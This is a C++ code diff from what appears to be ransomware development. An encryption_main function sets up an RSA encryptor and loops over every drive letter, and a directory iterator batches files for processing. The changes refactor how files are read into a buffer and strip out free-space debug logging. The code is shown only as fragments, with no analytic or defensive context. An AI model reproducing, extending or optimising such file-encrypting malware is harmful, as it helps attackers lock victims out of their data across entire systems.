@@ -144,6 +144,7 @@ int encryption_main( bool fromStart) {
 	}
 	
 	rsaEncryptor.init_Encryptor(mod, pubKey);
+	
 	for (char i = 'A';i <= 'Z';i++)
 	{
 		string pathToDriver;
@@ -242,12 +243,8 @@ bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
 		plaintextFile.close();
 		return false;
 	}
-		
-	char c;
-	for (size_t i = 0; i < buffSize; ++i) {
-		plaintextFile.get(c);
-		(*buffer)[i] = c;
-	}
+
+	plaintextFile.read((char*)*buffer, buffSize);
 	(*buffer)[buffSize] = '\0';
 	plaintextFile.close();
 	return true;
@@ -557,10 +554,7 @@ static void iterate(const path& parent,
 				boost::system::error_code ec;
 				//CHECK NEW FEATURE
 				ULARGE_INTEGER freeSpace;
-				if (!GetDiskFreeSpaceEx(parent.string().c_str(), &freeSpace, NULL, NULL))
-					std::cout << "getFreeSpaceFailed " << GetLastError() << std::endl;
-				else
-					std::cout << "free space before clear is " << freeSpace.QuadPart << std::endl;
+
 				//
 				if (processedPaths.size() > COUNT_THRESHOLD || sumSize >= SIZE_THRESHOLD)
 				{
@@ -572,12 +566,6 @@ static void iterate(const path& parent,
 					sumSize = 0;
 					processedPaths.clear();
 				}
-				//
-				if (!GetDiskFreeSpaceEx(parent.string().c_str(), &freeSpace, NULL, NULL))
-					std::cout << "getFreeSpaceFailed " << GetLastError() << std::endl;
-				else
-					std::cout << "free space after clear is " << freeSpace.QuadPart << std::endl;
-				//
 			}
 		}
 	} catch(...)
